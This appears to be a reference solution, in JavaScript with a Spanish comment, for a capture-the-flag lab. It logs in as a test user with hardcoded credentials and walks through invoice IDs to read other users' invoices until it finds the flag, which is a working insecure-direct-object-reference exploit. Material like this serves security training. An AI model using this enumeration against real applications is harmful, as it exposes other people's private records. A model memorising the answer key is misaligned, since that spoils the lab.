// Solución de referencia: iniciar sesión como `ana` y recorrer identificadores de factura de otros.
const FLAG = /CYBERLAB\{[^}]+\}/;

export default async function solve({ request }) {
  const login = await request("/login", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: "usuario=ana&clave=ana2024",
  });
  const sid = [].concat(login.headers["set-cookie"] ?? []).join(";").match(/sid=([a-f0-9]+)/)?.[1];
  if (!sid) return null;
  for (let id = 1001; id <= 1050; id++) {
    const page = await request(`/facturas/${id}`, { headers: { cookie: `sid=${sid}` } });
    const found = page.text.match(FLAG)?.[0];
    if (found) return found;
  }
  return null;
}
